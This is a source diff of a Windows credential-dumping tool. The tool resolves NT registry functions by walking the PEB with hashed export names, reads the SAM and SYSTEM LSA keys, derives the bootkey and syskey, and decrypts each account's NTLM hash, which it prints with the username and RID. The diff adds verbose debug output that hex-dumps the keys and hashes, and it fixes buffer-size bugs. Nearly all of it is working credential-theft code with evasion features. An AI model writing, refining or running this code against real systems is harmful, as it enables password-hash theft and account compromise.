@@ -6,6 +6,12 @@
 
 //#define _CRT_SECURE_NO_WARNINGS
 
+#include <ctype.h>
+#include <stdarg.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
 #include <Windows.h>
 #include <winternl.h>
 
@@ -44,6 +50,135 @@ myNtQueryValueKey pMyNtQueryValueKey;
 myNtEnumerateValueKey pMyNtEnumerateValueKey;
 myNtClose pMyNtClose;
 myRtlInitUnicodeString pMyRtlInitUnicodeString;
+
+BOOL gDebugEnabled = FALSE;
+
+static void DebugPrintPrefix() {
+	printf("[DEBUG] ");
+}
+
+void DebugPrintf(const CHAR* format, ...) {
+	if (!gDebugEnabled) {
+		return;
+	}
+
+	DebugPrintPrefix();
+
+	va_list args;
+	va_start(args, format);
+	vprintf(format, args);
+	va_end(args);
+}
+
+void DebugWPrintf(const WCHAR* format, ...) {
+	if (!gDebugEnabled) {
+		return;
+	}
+
+	DebugPrintPrefix();
+
+	va_list args;
+	va_start(args, format);
+	vwprintf(format, args);
+	va_end(args);
+}
+
+static void DebugPrintHexInternal(const CHAR* label, const BYTE* data, ULONG totalLength, ULONG printLength) {
+	if (!gDebugEnabled) {
+		return;
+	}
+
+	DebugPrintf("%s (%lu bytes", label, totalLength);
+	if (printLength < totalLength) {
+		printf(", showing %lu", printLength);
+	}
+	printf("):");
+
+	if (data == NULL) {
+		printf(" <null>\n");
+		return;
+	}
+
+	if (printLength == 0) {
+		printf(" <empty>\n");
+		return;
+	}
+
+	for (ULONG i = 0; i < printLength; i++) {
+		if ((i % 16) == 0) {
+			printf("\n[DEBUG]   ");
+		}
+		printf("%02X", data[i]);
+		if ((i % 16) != 15 && i + 1 < printLength) {
+			printf(" ");
+		}
+	}
+
+	if (printLength < totalLength) {
+		printf("\n[DEBUG]   ... truncated ...");
+	}
+	printf("\n");
+}
+
+void DebugPrintHex(const CHAR* label, const BYTE* data, ULONG length) {
+	DebugPrintHexInternal(label, data, length, length);
+}
+
+void DebugPrintHexPreview(const CHAR* label, const BYTE* data, ULONG length, ULONG maxLength) {
+	ULONG printLength = length;
+	if (printLength > maxLength) {
+		printLength = maxLength;
+	}
+	DebugPrintHexInternal(label, data, length, printLength);
+}
+
+void DebugPrintWideString(const CHAR* label, const WCHAR* value) {
+	if (!gDebugEnabled) {
+		return;
+	}
+
+	DebugPrintPrefix();
+	printf("%s: ", label);
+	if (value == NULL) {
+		printf("<null>\n");
+		return;
+	}
+	wprintf(L"%ls\n", value);
+}
+
+void DebugPrintWideLength(const CHAR* label, const WCHAR* value, ULONG charLength) {
+	if (!gDebugEnabled) {
+		return;
+	}
+
+	DebugPrintPrefix();
+	printf("%s: ", label);
+	if (value == NULL) {
+		printf("<null>\n");
+		return;
+	}
+	wprintf(L"%.*ls\n", (int)charLength, value);
+}
+
+void DebugPrintGuid(const CHAR* label, REFGUID guid) {
+	if (!gDebugEnabled) {
+		return;
+	}
+
+	DebugPrintf("%s: {%08lX-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}\n",
+		label,
+		(ULONG)guid.Data1,
+		(UINT)guid.Data2,
+		(UINT)guid.Data3,
+		(UINT)guid.Data4[0],
+		(UINT)guid.Data4[1],
+		(UINT)guid.Data4[2],
+		(UINT)guid.Data4[3],
+		(UINT)guid.Data4[4],
+		(UINT)guid.Data4[5],
+		(UINT)guid.Data4[6],
+		(UINT)guid.Data4[7]);
+}
 
 // Get Address from Export in module by walking PEB. Thus, not calling GetModuleHandle + GetProcAddress.
 FARPROC myGetProcAddress(DWORD moduleHash, DWORD exportHash) {
@@ -127,57 +262,75 @@ void getSAM(PSAM samRegEntries[], PULONG size) {
 
 	DWORD ret;
 
+	DebugPrintf("Collecting SAM entries from live registry\n");
+	if (samRegEntries == NULL) {
+		DebugPrintf("SAM output buffer is NULL; probing entry count and byte size\n");
+	}
+	DebugPrintWideString("Live SAM Users key path", RegPath);
+
 	pMyRtlInitUnicodeString(&UnicodeRegPath, RegPath);
 	InitializeObjectAttributes(&attributes, &UnicodeRegPath, OBJ_CASE_INSENSITIVE, NULL, NULL);
 
 	ret = pMyNtOpenKey(&key, KEY_READ, &attributes);
+	DebugPrintf("NtOpenKey(SAM Users) returned 0x%08lX\n", ret);
 
 	if (!NT_SUCCESS(ret)) {
 		exit(ret);
 	}
 
 	ret = pMyNtQueryKey(key, KeyFullInformation, NULL, 0, &lengthBuff);
+	DebugPrintf("NtQueryKey(SAM Users size probe) returned 0x%08lX; required bytes: %lu\n", ret, lengthBuff);
 
 	keyInfo = (PKEY_FULL_INFORMATION)HeapAlloc(GetProcessHeap(), 0, lengthBuff);
 
 	ret = pMyNtQueryKey(key, KeyFullInformation, keyInfo, lengthBuff, &lengthBuff);
+	DebugPrintf("NtQueryKey(SAM Users full information) returned 0x%08lX\n", ret);
 
 	if (!NT_SUCCESS(ret)) {
 		exit(ret);
 	}
 
+	DebugPrintf("SAM Users subkeys found: %lu; processing at most %d\n", keyInfo->SubKeys, MAX_SAM_ENTRIES);
 
 	for (ULONG i = 0; i < keyInfo->SubKeys && i < MAX_SAM_ENTRIES; i++) {
 		maxLenOfNames = MAX_KEY_LENGTH;
 
 		ret = pMyNtEnumerateKey(key, i, KeyBasicInformation, NULL, 0, &lengthBuff);
+		DebugPrintf("NtEnumerateKey(SAM Users[%lu] size probe) returned 0x%08lX; required bytes: %lu\n", i, ret, lengthBuff);
 
 		keyInfoSubKeysBasic = (PKEY_BASIC_INFORMATION)HeapAlloc(GetProcessHeap(), 0, lengthBuff);
 
 		ret = pMyNtEnumerateKey(key, i, KeyBasicInformation, keyInfoSubKeysBasic, lengthBuff, &lengthBuff);
+		DebugPrintf("NtEnumerateKey(SAM Users[%lu]) returned 0x%08lX\n", i, ret);
 
 		if (!NT_SUCCESS(ret)) {
 			exit(ret);
 		}
 
+		DebugPrintWideLength("SAM Users subkey name", keyInfoSubKeysBasic->Name, keyInfoSubKeysBasic->NameLength / sizeof(WCHAR));
+
 		if (wcsncmp(L"00", keyInfoSubKeysBasic->Name, wcslen(L"00")) == 0) {
 			WCHAR RegPathSubKeyV[MAX_PATH] = { L'\\',L'R',L'e',L'g',L'i',L's',L't',L'r',L'y',L'\\',L'M',L'a',L'c',L'h',L'i',L'n',L'e',L'\\',L'S',L'A',L'M',L'\\',L'S',L'A',L'M',L'\\',L'D',L'o',L'm',L'a',L'i',L'n',L's',L'\\',L'A',L'c',L'c',L'o',L'u',L'n',L't',L'\\',L'U',L's',L'e',L'r',L's',L'\\', L'\0' };
 			wcsncat_s(RegPathSubKeyV, MAX_PATH, keyInfoSubKeysBasic->Name, _TRUNCATE);
+			DebugPrintWideString("Processing RID key", RegPathSubKeyV);
 
 			pMyRtlInitUnicodeString(&UnicodeRegPathSubKeyV, RegPathSubKeyV);
 			InitializeObjectAttributes(&attributesSubKeyV, &UnicodeRegPathSubKeyV, OBJ_CASE_INSENSITIVE, NULL, NULL);
 
 			ret = pMyNtOpenKey(&subKeyV, KEY_READ, &attributesSubKeyV);
+			DebugPrintf("NtOpenKey(RID V key) returned 0x%08lX\n", ret);
 
 			if (!NT_SUCCESS(ret)) {
 				exit(ret);
 			}
 
 			ret = pMyNtQueryKey(subKeyV, KeyFullInformation, NULL, 0, &lengthBuff);
+			DebugPrintf("NtQueryKey(RID V size probe) returned 0x%08lX; required bytes: %lu\n", ret, lengthBuff);
 
 			keyInfoSubKeyV = (PKEY_FULL_INFORMATION)HeapAlloc(GetProcessHeap(), 0, lengthBuff);
 
 			ret = pMyNtQueryKey(subKeyV, KeyFullInformation, keyInfoSubKeyV, lengthBuff, &lengthBuff);
+			DebugPrintf("NtQueryKey(RID V full information) returned 0x%08lX\n", ret);
 
 			if (!NT_SUCCESS(ret)) {
 				exit(ret);
@@ -185,42 +338,54 @@ void getSAM(PSAM samRegEntries[], PULONG size) {
 
 			PSAM sam = (PSAM)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(SAM));
 			wcscpy_s(sam->rid, MAX_KEY_LENGTH, keyInfoSubKeysBasic->Name);
+			DebugPrintWideString("RID selected for SAM entry", sam->rid);
 
 			getClasses(sam);
+			DebugPrintWideString("SYSTEM LSA class material collected for RID", sam->classes);
 
 			for (ULONG j = 0; j < keyInfoSubKeyV->Values; j++) {
 				ret = pMyNtEnumerateValueKey(subKeyV, j, KeyValueFullInformation, NULL, 0, &lengthBuff);
+				DebugPrintf("NtEnumerateValueKey(RID value[%lu] size probe) returned 0x%08lX; required bytes: %lu\n", j, ret, lengthBuff);
 
 				keyValuesSubKey = (PKEY_VALUE_FULL_INFORMATION)HeapAlloc(GetProcessHeap(), 0, lengthBuff);
 
 				ret = pMyNtEnumerateValueKey(subKeyV, j, KeyValueFullInformation, keyValuesSubKey, lengthBuff, &lengthBuff);
+				DebugPrintf("NtEnumerateValueKey(RID value[%lu]) returned 0x%08lX\n", j, ret);
 
 				if (!NT_SUCCESS(ret)) {
 					exit(ret);
 				}
 
+				DebugPrintWideLength("RID value name", keyValuesSubKey->Name, keyValuesSubKey->NameLength / sizeof(WCHAR));
+
 				if (wcsncmp(keyValuesSubKey->Name, L"V", keyValuesSubKey->NameLength) == 0) {
 					PVOID data = (PVOID)((ULONG_PTR)keyValuesSubKey + keyValuesSubKey->DataOffset);
 					CopyMemory(sam->v, data, keyValuesSubKey->DataLength);
 					sam->vLen = keyValuesSubKey->DataLength;
+					DebugPrintf("Captured SAM V value for RID; length: %lu bytes\n", sam->vLen);
+					DebugPrintHexPreview("SAM V value preview", sam->v, sam->vLen, 64);
 				}
 				HeapFree(GetProcessHeap(), 0, keyValuesSubKey);
 			}
 			WCHAR RegPathSubKeyF[MAX_PATH] = { L'\\',L'R',L'e',L'g',L'i',L's',L't',L'r',L'y',L'\\',L'M',L'a',L'c',L'h',L'i',L'n',L'e',L'\\',L'S',L'A',L'M',L'\\',L'S',L'A',L'M',L'\\',L'D',L'o',L'm',L'a',L'i',L'n',L's',L'\\',L'A',L'c',L'c',L'o',L'u',L'n',L't',L'\\', L'\0' };
+			DebugPrintWideString("Opening SAM Account key for F value", RegPathSubKeyF);
 			pMyRtlInitUnicodeString(&UnicodeRegPathSubKeyF, RegPathSubKeyF);
 			InitializeObjectAttributes(&attributesSubKeyF, &UnicodeRegPathSubKeyF, OBJ_CASE_INSENSITIVE, NULL, NULL);
 
 			ret = pMyNtOpenKey(&subKeyF, KEY_READ, &attributesSubKeyF);
+			DebugPrintf("NtOpenKey(Account F key) returned 0x%08lX\n", ret);
 
 			if (!NT_SUCCESS(ret)) {
 				exit(ret);
 			}
 
 			ret = pMyNtQueryKey(subKeyF, KeyFullInformation, NULL, 0, &lengthBuff);
+			DebugPrintf("NtQueryKey(Account F size probe) returned 0x%08lX; required bytes: %lu\n", ret, lengthBuff);
 
 			keyInfoSubKeyF = (PKEY_FULL_INFORMATION)HeapAlloc(GetProcessHeap(), 0, lengthBuff);
 
 			ret = pMyNtQueryKey(subKeyF, KeyFullInformation, keyInfoSubKeyF, lengthBuff, &lengthBuff);
+			DebugPrintf("NtQueryKey(Account F full information) returned 0x%08lX\n", ret);
 
 			if (!NT_SUCCESS(ret)) {
 				exit(ret);
@@ -228,25 +393,32 @@ void getSAM(PSAM samRegEntries[], PULONG size) {
 
 			for (ULONG j = 0; j < keyInfoSubKeyF->Values; j++) {
 				ret = pMyNtEnumerateValueKey(subKeyF, j, KeyValueFullInformation, NULL, 0, &lengthBuff);
+				DebugPrintf("NtEnumerateValueKey(Account value[%lu] size probe) returned 0x%08lX; required bytes: %lu\n", j, ret, lengthBuff);
 
 				keyValuesSubKey = (PKEY_VALUE_FULL_INFORMATION)HeapAlloc(GetProcessHeap(), 0, lengthBuff);
 
 				ret = pMyNtEnumerateValueKey(subKeyF, j, KeyValueFullInformation, keyValuesSubKey, lengthBuff, &lengthBuff);
+				DebugPrintf("NtEnumerateValueKey(Account value[%lu]) returned 0x%08lX\n", j, ret);
 
 				if (!NT_SUCCESS(ret)) {
 					exit(ret);
 				}
 
+				DebugPrintWideLength("Account value name", keyValuesSubKey->Name, keyValuesSubKey->NameLength / sizeof(WCHAR));
+
 				if (wcsncmp(keyValuesSubKey->Name, L"F", keyValuesSubKey->NameLength) == 0) {
 					PVOID data = (PVOID)((ULONG_PTR)keyValuesSubKey + keyValuesSubKey->DataOffset);
 					CopyMemory(sam->f, data, keyValuesSubKey->DataLength);
 					sam->fLen = keyValuesSubKey->DataLength;
+					DebugPrintf("Captured SAM F value for RID; length: %lu bytes\n", sam->fLen);
+					DebugPrintHexPreview("SAM F value preview", sam->f, sam->fLen, 64);
 				}
 				HeapFree(GetProcessHeap(), 0, keyValuesSubKey);
 			}
 
 			sams[nEntries] = sam;
 			nEntries++;
+			DebugPrintf("Stored SAM entry index %lu\n", nEntries - 1);
 			HeapFree(GetProcessHeap(), 0, keyInfoSubKeyV);
 			HeapFree(GetProcessHeap(), 0, keyInfoSubKeyF);
 			pMyNtClose(subKeyV);
@@ -260,6 +432,7 @@ void getSAM(PSAM samRegEntries[], PULONG size) {
 
 	ULONG lenRet = nEntries * sizeof(SAM);
 	CopyMemory(size, &lenRet, sizeof(ULONG));
+	DebugPrintf("Live registry SAM collection completed: %lu entries, %lu bytes\n", nEntries, lenRet);
 
 	if (samRegEntries != NULL) {
 		for (int i = 0; i < nEntries; i++) {
@@ -277,30 +450,48 @@ void decryptSAM(PSAM samRegEntries[], int entries) {
 	CHAR strMagic2[] = { '0','1','2','3','4','5','6','7','8','9','0','1','2','3','4','5','6','7','8','9','0','1','2','3','4','5','6','7','8','9','0','1','2','3','4','5','6','7','8','9', '\0' };
 	CHAR strMagic3[] = { 'N','T','P','A','S','S','W','O','R','D', '\0' };
 
+	DebugPrintf("Starting SAM decryption for %d entries\n", entries);
+
 	for (int i = 0; i < entries; i++) {
+		DebugPrintf("---- Decrypting SAM entry %d ----\n", i);
+		DebugPrintWideString("Entry RID", samRegEntries[i]->rid);
+		DebugPrintf("Input V length: %lu bytes; F length: %lu bytes\n", samRegEntries[i]->vLen, samRegEntries[i]->fLen);
+
 		LONG offset = 0;
 		CopyMemory(&offset, &samRegEntries[i]->v[0x0C], 4);
+		DebugPrintf("Username relative offset read from V[0x0C]: 0x%08lX\n", (ULONG)offset);
 		offset += 0xCC;
+		DebugPrintf("Username absolute offset after V header adjustment: 0x%08lX\n", (ULONG)offset);
 
 		LONG lenUsername = (LONG)samRegEntries[i]->v[0x10];
-		PWCHAR username = (PWCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, lenUsername);
+		DebugPrintf("Username length read from V[0x10]: %ld bytes\n", lenUsername);
+		PWCHAR username = (PWCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, lenUsername + sizeof(WCHAR));
 		CopyMemory(username, &samRegEntries[i]->v[offset], lenUsername);
+		DebugPrintWideLength("Username recovered from V record", username, lenUsername / sizeof(WCHAR));
 
 		offset = 0;
 		CopyMemory(&offset, &samRegEntries[i]->v[0xA8], 4);
+		DebugPrintf("NTLM hash relative offset read from V[0xA8]: 0x%08lX\n", (ULONG)offset);
 		offset += 0xCC;
+		DebugPrintf("NTLM hash absolute offset after V header adjustment: 0x%08lX\n", (ULONG)offset);
+		DebugPrintf("NTLM hash storage marker V[0xAC]: 0x%02X\n", samRegEntries[i]->v[0xAC]);
 
 		BYTE bootKey[16];
 		getBootKey(samRegEntries[i], bootKey);
+		DebugPrintHex("Bootkey derived from SYSTEM LSA class material", bootKey, 16);
 
 		BYTE encNTLMrecovered[16] = {};
 
 		if (samRegEntries[i]->v[0xAC] == 0x38) {
+			DebugPrintf("Using post-Windows 10 1909 AES path for syskey and NTLM hash blob\n");
 			BYTE encSyskey[16] = {};
 			BYTE encSyskeyIV[16] = {};
 			// encSyskeyKey = bootkey
 			CopyMemory(encSyskey, &samRegEntries[i]->f[0x88], 16);
 			CopyMemory(encSyskeyIV, &samRegEntries[i]->f[0x78], 16);
+			DebugPrintHex("Encrypted syskey from F[0x88]", encSyskey, 16);
+			DebugPrintHex("Syskey AES-CBC IV from F[0x78]", encSyskeyIV, 16);
+			DebugPrintHex("Syskey AES-CBC key (bootkey)", bootKey, 16);
 
 			CBC_Mode< AES >::Decryption d;
 			d.SetKeyWithIV(bootKey, 16, encSyskeyIV, 16);
@@ -313,12 +504,17 @@ void decryptSAM(PSAM samRegEntries[], int entries) {
 					StreamTransformationFilter::NO_PADDING
 				)
 			);
+			DebugPrintHex("Recovered syskey from AES-CBC(encSyskey, bootkey, F IV)", sysKey, 16);
 
 			BYTE encNTLMIV[16] = {};
 			BYTE encNTLM[16] = {};
 			CopyMemory(encNTLMIV, &samRegEntries[i]->v[offset + 0x8], 16);
 			CopyMemory(encNTLM, &samRegEntries[i]->v[offset + 0x18], 16);
 			// encNTLMKey = sysKey
+			DebugPrintf("NTLM AES blob uses IV at V[0x%08lX] and ciphertext at V[0x%08lX]\n", (ULONG)(offset + 0x8), (ULONG)(offset + 0x18));
+			DebugPrintHex("Encrypted NTLM AES-CBC IV", encNTLMIV, 16);
+			DebugPrintHex("Encrypted NTLM hash blob", encNTLM, 16);
+			DebugPrintHex("NTLM AES-CBC key (recovered syskey)", sysKey, 16);
 
 			CBC_Mode< AES >::Decryption d2;
 			d2.SetKeyWithIV(sysKey, 16, encNTLMIV, 16);
@@ -330,12 +526,20 @@ void decryptSAM(PSAM samRegEntries[], int entries) {
 					StreamTransformationFilter::NO_PADDING
 				)
 			);
+			DebugPrintHex("DES-encrypted NTLM hash recovered from AES-CBC", encNTLMrecovered, 16);
 
 		}
 		else if (samRegEntries[i]->v[0xAC] == 0x14) {
+			DebugPrintf("Using legacy RC4 path for syskey and NTLM hash blob\n");
 			BYTE encSyskey[16] = {};
 			BYTE encSyskeyKey[16] = {};
 			CopyMemory(encSyskey, &samRegEntries[i]->f[0x80], 16);
+			DebugPrintHex("Encrypted syskey from F[0x80]", encSyskey, 16);
+			DebugPrintHex("RC4 syskey salt from F[0x70]", &samRegEntries[i]->f[0x70], 16);
+			DebugPrintf("RC4 syskey MD5 input: F[0x70] salt + magic1 + bootkey + magic2\n");
+			DebugPrintf("magic1: %s\n", strMagic1);
+			DebugPrintf("magic2: %s\n", strMagic2);
+			DebugPrintHex("Bootkey used in RC4 syskey MD5 input", bootKey, 16);
 
 			MD5 hash;
 
@@ -344,6 +548,7 @@ void decryptSAM(PSAM samRegEntries[], int entries) {
 			hash.Update((PBYTE)&bootKey, 16);
 			hash.Update((PBYTE)&strMagic2, strlen(strMagic2));
 			hash.Final(encSyskeyKey);
+			DebugPrintHex("RC4 key for syskey generated by MD5", encSyskeyKey, 16);
 
 			BYTE sysKey[16] = {};
 
@@ -351,30 +556,37 @@ void decryptSAM(PSAM samRegEntries[], int entries) {
 			dec.SetKey(encSyskeyKey, 16);
 
 			dec.ProcessData(sysKey, encSyskey, 16);
+			DebugPrintHex("Recovered syskey from RC4(encSyskey, MD5 key)", sysKey, 16);
 
 			BYTE encNTLMKey[16] = {};
 			BYTE encNTLM[16] = {};
 			CopyMemory(encNTLMKey, &samRegEntries[i]->v[offset + 0x4], 16);
 			CopyMemory(encNTLM, &samRegEntries[i]->v[offset + 0x4], 16);
+			DebugPrintf("Legacy NTLM encrypted blob copied from V[0x%08lX]\n", (ULONG)(offset + 0x4));
+			DebugPrintHex("Encrypted NTLM RC4 blob", encNTLM, 16);
 
 			BYTE aux[4] = {};
 			getAuxSyskey(samRegEntries[i], aux);
+			DebugPrintHex("RID-derived RC4 NTLM aux value", aux, 4);
+			DebugPrintf("RC4 NTLM MD5 input: recovered syskey + RID aux + magic3\n");
+			DebugPrintf("magic3: %s\n", strMagic3);
 
 			MD5 hash2;
 			hash2.Update(sysKey, 16);
 			hash2.Update(aux, 4);
 			hash2.Update((PBYTE)&strMagic3, strlen(strMagic3));
 			hash2.Final(encNTLMKey);
-
-			BYTE encNTLMRecovered[16] = {};
+			DebugPrintHex("RC4 key for NTLM hash blob generated by MD5", encNTLMKey, 16);
 
 			ARC4::Decryption dec2;
 			dec2.SetKey(encNTLMKey, 16);
-			dec2.ProcessData(encNTLMRecovered, encNTLM, 16);
+			dec2.ProcessData(encNTLMrecovered, encNTLM, 16);
+			DebugPrintHex("DES-encrypted NTLM hash recovered from RC4", encNTLMrecovered, 16);
 
 		}
 		else {
 			// TODO default: return blank hash 31D6CFE0D16AE931B73C59D7E0C089C0 or print some error
+			DebugPrintf("Unsupported NTLM hash storage marker 0x%02X; DES stage will receive zeroed data\n", samRegEntries[i]->v[0xAC]);
 		}
 
 		/* TODO: REFACTOR THIS */
@@ -390,6 +602,10 @@ void decryptSAM(PSAM samRegEntries[], int entries) {
 		// desKey2IV = desKey2
 		strToKey(desStr1, desKey1);
 		strToKey(desStr2, desKey2);
+		DebugPrintHex("RID-derived DES source 1", desStr1, 7);
+		DebugPrintHex("RID-derived DES source 2", desStr2, 7);
+		DebugPrintHex("DES key 1 after odd parity expansion", desKey1, 8);
+		DebugPrintHex("DES key 2 after odd parity expansion", desKey2, 8);
 
 		ECB_Mode< DES >::Decryption desD;
 		desD.SetKey(desKey1, 8);
@@ -398,6 +614,8 @@ void decryptSAM(PSAM samRegEntries[], int entries) {
 		BYTE encNTLM2[8] = {};
 		CopyMemory(encNTLM1, encNTLMrecovered, 8);
 		CopyMemory(encNTLM2, encNTLMrecovered + 0x8, 8);
+		DebugPrintHex("First DES-encrypted NTLM half", encNTLM1, 8);
+		DebugPrintHex("Second DES-encrypted NTLM half", encNTLM2, 8);
 
 		BYTE NTLM1[8] = {};
 		BYTE NTLM2[8] = {};
@@ -409,6 +627,7 @@ void decryptSAM(PSAM samRegEntries[], int entries) {
 				StreamTransformationFilter::NO_PADDING
 			)
 		);
+		DebugPrintHex("First NTLM half after DES-ECB", NTLM1, 8);
 
 		ECB_Mode< DES >::Decryption desD2;
 		desD2.SetKey(desKey2, 8);
@@ -420,18 +639,21 @@ void decryptSAM(PSAM samRegEntries[], int entries) {
 				StreamTransformationFilter::NO_PADDING
 			)
 		);
+		DebugPrintHex("Second NTLM half after DES-ECB", NTLM2, 8);
 
 		BYTE NTLM[16] = {};
 		CHAR NTLMstr[33] = {};
 		int ridN = (int)wcstol(samRegEntries[i]->rid, NULL, 16);
 		CopyMemory(NTLM, NTLM1, 8);
 		CopyMemory(NTLM + 0x8, NTLM2, 8);
+		DebugPrintHex("Final NTLM hash bytes", NTLM, 16);
 
 		for (int i = 0; i < 16; i++) {
 			sprintf_s(NTLMstr + (i * 2), 3, "%02x", NTLM[i]);
 		}
 
 		toUpperStr(NTLMstr);
+		DebugPrintf("Final NTLM hash string: %s\n", NTLMstr);
 
 		wprintf(L"User [ %s ] with RID [ %d ] -> ", username, ridN);
 		printf("NT: %s\n", NTLMstr);
@@ -488,37 +710,47 @@ void getClasses(PSAM samRegEntry) {
 
 	DWORD ret;
 
+	DebugPrintf("Collecting SYSTEM LSA class strings from live registry\n");
+
 	for (int i = 0; i < 4; i++) {
 		WCHAR RegAux[MAX_PATH] = L"\0";
 
 		wcscpy_s(RegAux, MAX_PATH, Reg);
 		wcsncat_s(RegAux, MAX_PATH, sAll[i], _TRUNCATE);
+		DebugPrintWideString("Opening SYSTEM LSA class key", RegAux);
 
 		pMyRtlInitUnicodeString(&UnicodeRegPath, RegAux);
 		InitializeObjectAttributes(&attributes, &UnicodeRegPath, OBJ_CASE_INSENSITIVE, NULL, NULL);
 
 		ret = pMyNtOpenKey(&key, KEY_READ, &attributes);
+		DebugPrintf("NtOpenKey(SYSTEM LSA class key) returned 0x%08lX\n", ret);
 
 		if (!NT_SUCCESS(ret)) {
 			exit(ret);
 		}
 
 		ret = pMyNtQueryKey(key, KeyFullInformation, NULL, 0, &lengthBuff);
+		DebugPrintf("NtQueryKey(SYSTEM LSA class size probe) returned 0x%08lX; required bytes: %lu\n", ret, lengthBuff);
 
 		keyInfo = (PKEY_FULL_INFORMATION)HeapAlloc(GetProcessHeap(), 0, lengthBuff);
 
 		ret = pMyNtQueryKey(key, KeyFullInformation, keyInfo, lengthBuff, &lengthBuff);
+		DebugPrintf("NtQueryKey(SYSTEM LSA class full information) returned 0x%08lX\n", ret);
 
 		if (!NT_SUCCESS(ret)) {
 			exit(ret);
 		}
 
+		DebugPrintf("SYSTEM LSA class bytes: %lu\n", keyInfo->ClassLength);
+
 		PWCHAR data = (PWCHAR)((ULONG_PTR)keyInfo + keyInfo->ClassOffset);
 
-		PWCHAR aux = (PWCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, keyInfo->ClassLength);
+		PWCHAR aux = (PWCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, keyInfo->ClassLength + sizeof(WCHAR));
 
 		CopyMemory(aux, data, keyInfo->ClassLength);
+		DebugPrintWideLength("SYSTEM LSA class chunk", aux, keyInfo->ClassLength / sizeof(WCHAR));
 		wcsncat_s(resul, MAX_KEY_VALUE_LENGTH, aux, _TRUNCATE);
+		DebugPrintWideString("Accumulated SYSTEM LSA class material", resul);
 
 		HeapFree(GetProcessHeap(), 0, keyInfo);
 		HeapFree(GetProcessHeap(), 0, aux);
@@ -526,6 +758,7 @@ void getClasses(PSAM samRegEntry) {
 		pMyNtClose(key);
 	}
 	wcscpy_s(samRegEntry->classes, MAX_KEY_VALUE_LENGTH, resul);
+	DebugPrintWideString("Final SYSTEM LSA class material", samRegEntry->classes);
 
 	return;
 }
@@ -533,6 +766,8 @@ void getClasses(PSAM samRegEntry) {
 void getBootKey(PSAM samRegEntry, PBYTE bootKeyRet) {
 	LONG magics[16] = { 8,5,4,2,11,9,13,3,0,6,1,12,14,10,15,7 };
 	BYTE bootKey[16] = {};
+	DebugPrintWideString("Bootkey source class material", samRegEntry->classes);
+	DebugPrintf("Bootkey class-byte permutation: 8,5,4,2,11,9,13,3,0,6,1,12,14,10,15,7\n");
 	for (int i = 0; i < 16; i++) {
 		CHAR auxStr[3] = {};
 
@@ -544,6 +779,7 @@ void getBootKey(PSAM samRegEntry, PBYTE bootKeyRet) {
 		bootKey[i] = strtoul(auxStr, &end, 16);
 	}
 	CopyMemory(bootKeyRet, bootKey, 16);
+	DebugPrintHex("Bootkey helper output", bootKeyRet, 16);
 }
 
 void getDESStr1(PSAM samRegEntry, PBYTE desStr1Ret) {
@@ -579,9 +815,9 @@ void getDESStr2(PSAM samRegEntry, PBYTE desStr2Ret) {
 }
 
 void getAuxSyskey(PSAM samRegEntry, PBYTE auxSyskeyRet) {
-	LONG magics[7] = { 3,2,1,0 };
-	BYTE auxSyskey[7] = {};
-	for (int i = 0; i < 7; i++) {
+	LONG magics[4] = { 3,2,1,0 };
+	BYTE auxSyskey[4] = {};
+	for (int i = 0; i < 4; i++) {
 		CHAR auxStr[3] = {};
 
 		PCHAR end;
@@ -591,7 +827,7 @@ void getAuxSyskey(PSAM samRegEntry, PBYTE auxSyskeyRet) {
 
 		auxSyskey[i] = strtoul(auxStr, &end, 16);
 	}
-	CopyMemory(auxSyskeyRet, auxSyskey, 7);
+	CopyMemory(auxSyskeyRet, auxSyskey, 4);
 }
 
 void toUpperStr(char* s) {
@@ -695,7 +931,15 @@ int main(int argc, char** argv) {
 		}
 	}
 
+	gDebugEnabled = debugFlag;
+	DebugPrintf("Debug mode enabled\n");
+	DebugPrintf("Parsed options: registry=%s, shadowSnapshot=%s, customCallback=%s\n",
+		useRegistryFlag ? "true" : "false",
+		useShadowSnapshotFlag ? "true" : "false",
+		proxyNTCallsFlag ? "true" : "false");
+
 	if (proxyNTCallsFlag) {
+		DebugPrintf("Using custom callback proxy functions for NT calls\n");
 		pMyNtOpenKey = proxyNtOpenKey;
 		pMyNtQueryKey = proxyNtQueryKey;
 		pMyNtEnumerateKey = proxyNtEnumerateKey;
@@ -705,6 +949,7 @@ int main(int argc, char** argv) {
 		pMyRtlInitUnicodeString = proxyRtlInitUnicodeString;
 	}
 	else {
+		DebugPrintf("Resolving NT functions by walking PEB export tables\n");
 		FARPROC auxPMyNtOpenKey = myGetProcAddress(ntdlldll_RFDT, NtOpenKey_RFDT);
 		FARPROC auxPMyNtQueryKey = myGetProcAddress(ntdlldll_RFDT, NtQueryKey_RFDT);
 		FARPROC auxPMyNtEnumerateKey = myGetProcAddress(ntdlldll_RFDT, NtEnumerateKey_RFDT);
@@ -722,19 +967,31 @@ int main(int argc, char** argv) {
 		pMyRtlInitUnicodeString = (myRtlInitUnicodeString)auxPMyRtlInitUnicodeString;
 	}
 
+	DebugPrintf("NtOpenKey pointer: %p\n", (PVOID)pMyNtOpenKey);
+	DebugPrintf("NtQueryKey pointer: %p\n", (PVOID)pMyNtQueryKey);
+	DebugPrintf("NtEnumerateKey pointer: %p\n", (PVOID)pMyNtEnumerateKey);
+	DebugPrintf("NtQueryValueKey pointer: %p\n", (PVOID)pMyNtQueryValueKey);
+	DebugPrintf("NtEnumerateValueKey pointer: %p\n", (PVOID)pMyNtEnumerateValueKey);
+	DebugPrintf("NtClose pointer: %p\n", (PVOID)pMyNtClose);
+	DebugPrintf("RtlInitUnicodeString pointer: %p\n", (PVOID)pMyRtlInitUnicodeString);
+
 
 	if (useRegistryFlag) {
+		DebugPrintf("Running live registry SAM extraction method\n");
 		ULONG size;
 		PSAM sam[MAX_SAM_ENTRIES] = {};
 
 		getSAM(NULL, &size);
+		DebugPrintf("Live registry size probe returned %lu bytes (%lu entries)\n", size, size / sizeof(SAM));
 
 		getSAM(sam, &size);
+		DebugPrintf("Live registry collection returned %lu bytes (%lu entries)\n", size, size / sizeof(SAM));
 
 		decryptSAM(sam, size / sizeof(SAM));
 	}
 
 	if (useShadowSnapshotFlag) {
+		DebugPrintf("Running shadow snapshot SAM extraction method\n");
 		ULONG size;
